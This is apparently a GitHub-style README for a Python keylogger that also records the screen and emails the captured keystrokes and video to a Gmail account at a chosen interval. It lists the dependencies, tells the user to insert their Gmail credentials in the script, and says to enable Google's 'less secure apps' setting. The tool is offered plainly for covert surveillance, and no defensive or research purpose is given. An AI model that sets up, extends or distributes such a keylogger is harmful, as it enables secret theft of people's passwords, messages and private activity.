# Keylogger with screen recorder
A keylogger that sends logs on email and records screen.

# Installation

This script requires numpy, pyautogui, opencv, requests, pynput and pypiwin32.

Install packages from console

```bash
pip install numpy pyautogui opencv-python requests pynput pypiwin32
```

# Instructions

- This script requires continuous Internet connection

- Change 183 line in Python file to set your email and password **(ONLY GMAIL MAILBOX)**
```python
183. e = SendEmail('YOUR_EMAIL', 'YOUR_PASSWORD', TIME)
```
**Remember to set the frequency of sending emails on your mailbox by changing the TIME value**

The TIME value is expressed in seconds

- **YOU NEED TO ALLOW LESS SECURE APPS ON YOUR GOOGLE ACCOUNT BEFORE USING THIS SCRIPT. YOU CAN DO IT HERE: https://myaccount.google.com/lesssecureapps**


> Example

```python
182. e = SendEmail('mailbox@gmail.com', 'password1', 10)
```

- Run script
